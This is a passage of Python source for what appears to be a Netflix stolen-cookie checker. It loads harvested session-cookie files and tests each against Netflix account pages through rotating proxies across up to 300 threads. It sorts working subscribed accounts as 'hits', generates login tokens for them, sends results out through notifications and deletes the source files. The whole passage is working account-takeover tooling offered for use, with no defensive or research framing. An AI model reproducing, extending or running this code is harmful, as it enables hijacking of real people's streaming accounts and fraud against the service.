        return candidate

    def handle_result(info, netscape_content, cookie_path, is_subscribed, cookie_dict, remove_source=True):
        user_guid = info.get("userGuid") if info.get("userGuid") and info.get("userGuid") != "null" else generate_unknown_guid()
        _, plan_name = derive_plan_info(info, is_subscribed)
        info["userGuid"] = user_guid
        country = info.get("countryOfSignup") or "Unknown"
        random_suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))

        if is_subscribed:
            max_streams = (info.get("maxStreams") or "Unknown").rstrip("}")
            filename = f"{max_streams}_{country}_{info.get('showExtraMemberSection')}_{user_guid}.txt"
        else:
            has_payment_method = "True" if decode_netflix_value(info.get("paymentMethodType")) not in {None, "", "UNKNOWN", "Unknown", "N/A"} else "False"
            filename = f"PaymentM-{has_payment_method}_{country}_{user_guid}_{random_suffix}.txt"

        email_value = (decode_netflix_value(info.get("email")) or "").strip().lower()
        duplicate_key = email_value or user_guid

        with guid_lock:
            if duplicate_key in processed_emails:
                nftoken_data = None
                if is_subscribed and get_nftoken_mode(config) != "false":
                    nftoken_data, _ = create_nftoken(cookie_dict, nftoken_retry_attempts)
                formatted_cookie = format_cookie_file(info, netscape_content, config, is_subscribed, nftoken_data)
                with file_locks["dup"]:
                    with open(DUP_FILE, "a", encoding="utf-8") as out_f:
                        out_f.write(formatted_cookie + "\n" + "=" * 40 + "\n")
                if remove_source and os.path.exists(cookie_path):
                    os.remove(cookie_path)
                return "BAD", plan_name, country, None
            processed_emails.add(duplicate_key)

        nftoken_data = None
        should_generate_nftoken = get_nftoken_mode(config) != "false" and (is_subscribed or nftoken_for_free)
        if should_generate_nftoken:
            nftoken_data, _ = create_nftoken(cookie_dict, nftoken_retry_attempts)
        formatted_cookie = format_cookie_file(info, netscape_content, config, is_subscribed, nftoken_data)

        if is_subscribed:
            hit_path = build_hit_filepath(info, plan_name, country, user_guid, random_suffix)
            with file_locks["hits"]:
                write_text_file_safely(hit_path, formatted_cookie)
            label = "HIT"
        else:
            with file_locks["free"]:
                with open(FREE_FILE, "a", encoding="utf-8") as out_f:
                    out_f.write(formatted_cookie + "\n" + "=" * 40 + "\n")
            label = "FREE"

        if remove_source and os.path.exists(cookie_path):
            os.remove(cookie_path)

        send_notifications(config, info, is_subscribed, filename, formatted_cookie)
        return label, plan_name, country, formatted_cookie

    def process_task(task):
        task_kind = task.get("kind")
        cookie_file = task.get("cookie_file")
        cookie_path = task.get("cookie_path")

        if task_kind == "read_error":
            try:
                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
            except Exception:
                pass
            status_box.bump("ERR")
            status_box.emit(f"  [ERR] {cookie_file}", YEL)
            return

        if task_kind == "missing_cookies":
            try:
                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
            except Exception:
                pass
            status_box.bump("BAD")
            status_box.emit(f"  [BAD] {cookie_file}", RED)
            return

        bundle = task.get("bundle") or {}
        netscape_content = bundle.get("netscape_text", "")
        bundle_label = task.get("bundle_label") or cookie_file
        remove_source_during_result = task.get("remove_source_during_result", True)

        try:
            cookies = bundle.get("cookies") or cookies_dict_from_netscape(netscape_content)
            if not cookies or not has_required_netflix_cookies(cookies):
                if remove_source_during_result and os.path.exists(cookie_path):
                    os.remove(cookie_path)
                status_box.bump("BAD")
                status_box.emit(f"  [BAD] {bundle_label}", RED)
                return

            session = requests.Session()
            session.cookies.update(cookies)

            used_proxy_indices = set()
            response_text = None
            status_code = None
            extracted_info = None

            for attempt in range(max_retry_attempts):
                proxy, proxy_index = get_next_proxy(used_proxy_indices)
                if proxy_index is not None:
                    used_proxy_indices.add(proxy_index)

                try:
                    response_text, status_code, extracted_info = get_account_page(
                        session,
                        proxy,
                        request_timeout=request_timeout_seconds,
                    )
                    if status_code == 200 and response_text:
                        break
                    if status_code in retryable_status_codes and attempt < max_retry_attempts - 1:
                        continue
                    break
                except Exception:
                    if attempt < max_retry_attempts - 1:
                        continue

            if status_code == 200 and response_text:
                info = extracted_info or extract_info(response_text)
                if info.get("countryOfSignup") and info.get("countryOfSignup") != "null":
                    is_subscribed = is_subscribed_account(info)
                    label, plan_name, country, _ = handle_result(
                        info,
                        netscape_content,
                        cookie_path,
                        is_subscribed,
                        cookies,
                        remove_source=remove_source_during_result,
                    )
                    status_box.bump(label)
                    if label == "HIT":
                        status_box.emit(f"  [HIT] {bundle_label} | Plan: {plan_name} | Country: {country}", LGREEN)
                    elif label == "FREE":
                        status_box.emit(f"  [FREE] {bundle_label} | Plan: FREE | Country: {country}", CYAN)
                    else:
                        status_box.emit(f"  [DUP] {bundle_label}", YEL)
                else:
                    if remove_source_during_result and os.path.exists(cookie_path):
                        os.remove(cookie_path)
                    status_box.bump("BAD")
                    status_box.emit(f"  [FAIL] {bundle_label}", RED)
            else:
                if remove_source_during_result and os.path.exists(cookie_path):
                    os.remove(cookie_path)
                status_box.bump("ERR")
                status_box.emit(f"  [ERR] {bundle_label}", YEL)
        except Exception:
            try:
                if remove_source_during_result and os.path.exists(cookie_path):
                    os.remove(cookie_path)
            except Exception:
                pass
            status_box.bump("ERR")
            status_box.emit(f"  [ERR] {bundle_label}", YEL)

    def worker():
        while not stop_requested.is_set():
            try:
                task = task_queue.get_nowait()
            except queue.Empty:
                break
            process_task(task)

    start_time = time.time()
    threads = []
    for _ in range(max(1, min(num_threads, max(1, cookies_total)))):
        t = threading.Thread(target=worker, daemon=True)
        threads.append(t)

    try:
        for t in threads:
            t.start()
        while any(t.is_alive() for t in threads):
            for t in threads:
                t.join(timeout=0.2)
    except KeyboardInterrupt:
        stop_requested.set()
        for t in threads:
            t.join(timeout=1)
        status_box.flush()
        return

    status_box.flush()
    elapsed = time.time() - start_time

    print("\n")
    print(out_c("  ╔══════════════════════════════════════════════╗", GREEN))

    def boxline(text, color=LGREEN, w=46):
        print(out_c("  ║", GREEN) + out_c(text.center(w), color) + out_c("║", GREEN))

    boxline(f"   DONE  ·  {elapsed:.1f}s")
    boxline(f"   hits {status_box.hits}  ·  free {status_box.free}", GREY)
    boxline("   hits: results/NETFLIX/hits/", GREY)
    print(out_c("  ╚══════════════════════════════════════════════╝", GREEN))
    print()


def main():
    print_banner()
    create_base_folders()
    cleanup_stale_temp_files()
    config, _ = load_config()

    initial_files = [
        f for f in os.listdir(cookies_folder)
        if not f.startswith(".") and f.lower().endswith((".txt", ".json"))
    ]
    if not initial_files:
        print(out_c("  [!] no cookies found in 'cookies/' (.txt / .json).", YEL))
        input(out_c("  [enter] exit...", GREY))
        return

    print(out_c(f"  [+] loaded {len(initial_files)} cookie files.", GREEN))

    proxy_opt = input(out_c("  [?] proxies [y/N]: ", LGREEN)).strip().lower()
    use_proxies = proxy_opt in ("y", "yes", "1", "s", "sim")
    if use_proxies:
        proxies = load_proxies()
        if proxies:
            print(out_c(f"  [+] {len(proxies)} proxies loaded.", LGREEN))
        else:
            print(out_c("  [!] proxy.txt empty/invalid. running direct.", YEL))
            use_proxies = False
    else:
        print(out_c("  [*] running direct.", GREY))

    try:
        num_threads_input = input(out_c("  [?] threads [30]: ", LGREEN)).strip()
        num_threads = int(num_threads_input) if num_threads_input else 30
        if num_threads < 1 or num_threads > 300:
            raise ValueError
    except ValueError:
        num_threads = 30

    check_cookies(num_threads, config, use_proxies=use_proxies)
    input(out_c("  [enter] exit...", GREY))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(out_c("\n\n  stopped by user.\n", YEL))